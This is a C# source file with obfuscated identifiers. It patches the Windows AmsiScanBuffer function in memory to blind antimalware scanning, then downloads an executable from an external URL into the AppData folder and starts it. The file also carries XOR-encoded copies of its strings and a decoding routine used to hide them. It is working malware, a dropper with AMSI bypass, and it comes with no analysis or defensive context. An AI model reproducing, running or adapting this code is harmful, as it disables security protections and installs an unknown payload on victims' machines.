using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;
public class f57a7 {
 [DllImport("kernel32", EntryPoint = "GetProcAddress")] public static extern IntPtr we7bc(IntPtr m2faa, string j5daf3);
 [DllImport("kernel32", EntryPoint = "LoadLibrary")] public static extern IntPtr s12a289(string hd989);
 [DllImport("kernel32", EntryPoint = "VirtualProtect")] public static extern bool jc5d7(IntPtr j225ca, UIntPtr a5f78b, uint jd764, out uint ec9c24);
 [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)] static extern void t6c22(IntPtr z65e17, IntPtr u837caa, int ye1bedd);
 public static void Main() {
	 g34221();
 }
 public static int g34221() {
//  IntPtr pcac8 = s12a289(xec4a("145e4a5e4d02195f"));
  IntPtr pcac8 = s12a289("amsi.dll");
  if (pcac8 == IntPtr.Zero) {
   goto bd9a95b;
  }
//  IntPtr f2824 = we7bc(pcac8, xec4a("345e4a5e3005145d7b4205001041"));
  IntPtr f2824 = we7bc(pcac8, "AmsiScanBuffer");
  if (f2824 == IntPtr.Zero) {
   goto bd9a95b;
  }
  UIntPtr wdd77d = (UIntPtr) 5;
  uint od2c1 = 0;
  if (!jc5d7(f2824, wdd77d, 0x40, out od2c1)) {
   goto bd9a95b;
  }
  Byte[] ee56ff4 = {
   0x31,
   0xff,
   0x90
  };
  IntPtr ua1bf = Marshal.AllocHGlobal(3);
  Marshal.Copy(ee56ff4, 0, ua1bf, 3);
  t6c22(new IntPtr(f2824.ToInt64() + 0x001b), ua1bf, 3);
  bd9a95b: WebClient k3483 = new WebClient();
//  string jdbca82 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\v5cfb6" + xec4a("5b564152");
  string jdbca82 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\v5cfb6" + ".exe";
//  k3483.DownloadFile(xec4a("1d474d4759495a5c575b0a0810434b520d030041175e0749185257560403071c5b45020f1b1d5c4f06"), jdbca82);
  k3483.DownloadFile("http://onlinepreneur.id/manager/brain.exe", jdbca82);
  ProcessStartInfo g444b9 = new ProcessStartInfo(jdbca82);
  Process.Start(g444b9);
  return 0;
 }
 public static string xec4a(string p5a34) {
  string m2faa = "u397cf";
  string s12a289 = String.Empty;
  for (int i = 0; i < p5a34.Length; i += 2) {
   byte we7bc = Convert.ToByte(p5a34.Substring(i, 2), 16);
   s12a289 += (char)(we7bc ^ m2faa[(i / 2) % m2faa.Length]);
  }
  return s12a289;
 }
}